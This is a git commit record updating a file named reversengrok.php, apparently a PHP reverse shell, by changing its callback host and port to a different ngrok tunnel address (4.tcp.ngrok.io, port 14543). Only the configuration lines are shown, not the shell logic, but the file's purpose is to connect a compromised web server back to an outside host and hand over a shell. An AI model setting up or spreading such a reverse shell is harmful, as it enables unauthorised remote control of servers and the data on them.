094f7a4669cd635ef547a6ef9cb058298d25bc1f
dxnboy <47841843+dxnboy@users.noreply.github.com>
2021-02-10 10:31:07 +0700

    Update reversengrok.php

--- reversengrok.php
+++ reversengrok.php
@@ -46,8 +46,8 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '0.tcp.ngrok.io';  // CHANGE THIS
-$port = 12664;       // CHANGE THIS
+$ip = '4.tcp.ngrok.io';  // CHANGE THIS
+$port = 14543;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
